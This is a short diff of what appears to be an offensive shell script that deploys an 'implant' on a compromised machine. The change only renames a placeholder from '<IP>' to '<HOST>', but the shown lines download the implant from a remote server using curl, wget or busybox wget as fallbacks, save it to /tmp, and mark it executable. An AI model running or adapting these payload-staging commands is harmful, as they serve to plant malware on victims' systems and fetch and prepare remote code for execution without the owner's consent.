@@ -77,9 +77,9 @@ USER=$(id -un)
 HOME=$(get_home "$USER")
 
 info "Pulling implant.."
-(command -v curl >/dev/null 2>&1 && curl -fsSL "http://<IP>:<PORT>/<IMPLANT>" -o /tmp/<IMPLANT>) || \
-(command -v wget >/dev/null 2>&1 && wget -qO /tmp/<IMPLANT> "http://<IP>:<PORT>/<IMPLANT>") || \
-(command -v busybox >/dev/null 2>&1 && busybox wget -qO /tmp/<IMPLANT> "http://<IP>:<PORT>/<IMPLANT>")
+(command -v curl >/dev/null 2>&1 && curl -fsSL "http://<HOST>:<PORT>/<IMPLANT>" -o /tmp/<IMPLANT>) || \
+(command -v wget >/dev/null 2>&1 && wget -qO /tmp/<IMPLANT> "http://<HOST>:<PORT>/<IMPLANT>") || \
+(command -v busybox >/dev/null 2>&1 && busybox wget -qO /tmp/<IMPLANT> "http://<HOST>:<PORT>/<IMPLANT>")
 
 info "Changing implant permissions.."
 chmod +x "/tmp/<IMPLANT>"
